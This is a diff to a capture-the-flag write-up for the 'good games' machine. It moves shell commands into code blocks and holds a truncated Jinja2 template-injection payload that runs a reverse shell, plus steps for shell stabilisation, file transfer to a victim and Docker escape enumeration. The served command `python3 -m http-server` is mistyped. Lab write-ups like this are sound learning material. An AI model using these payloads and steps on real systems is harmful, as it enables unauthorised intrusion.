@@ -122,11 +122,30 @@ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "
 [<img src="../images/good_games/rev_shell_success.png"
   style="width: 800px;"/>](../images/good_games/rev_shell_success.png)
   
-I now had a reverse shell which what appeared to be the root user.  I upgraded and stabilised my shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'` and then ctrl+z `stty raw -echo; fg` enter enter.  Then so I could clear my terminal `export TERM=xterm`. 
+I now had a reverse shell which what appeared to be the root user.  I upgraded and stabilised my shell with 
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+``` 
+and then ctrl+z 
+
+```bash
+stty raw -echo; fg
+``` 
+enter enter.  Then so I could clear my terminal 
+
+```bash
+export TERM=xterm
+``` 
 
 I found the `/home/augustus` directory and the user.txt file with the user flag.  But after poking around it became apparent I was not on the host machine.  It appeared I was inside a docker instance.  But the Augustus user was not mentioned in the `/etc/passwd` file which means it must be a user on the host machine. 
 
-I then downloaded and used a tool [deepce](https://github.com/stealthcopter/deepce).  I downloaded the latest version, created a python webserver on my attack machine `python3 -m http-server 8000` and transferred it to the victim machine.  
+I then downloaded and used a tool [deepce](https://github.com/stealthcopter/deepce).  I downloaded the latest version, created a python webserver on my attack machine 
+
+```bash
+python3 -m http-server 8000
+``` 
+and transferred it to the victim machine.  
 
 [<img src="../images/good_games/deepce.png"
   style="width: 800px;"/>](../images/good_games/deepce.png)
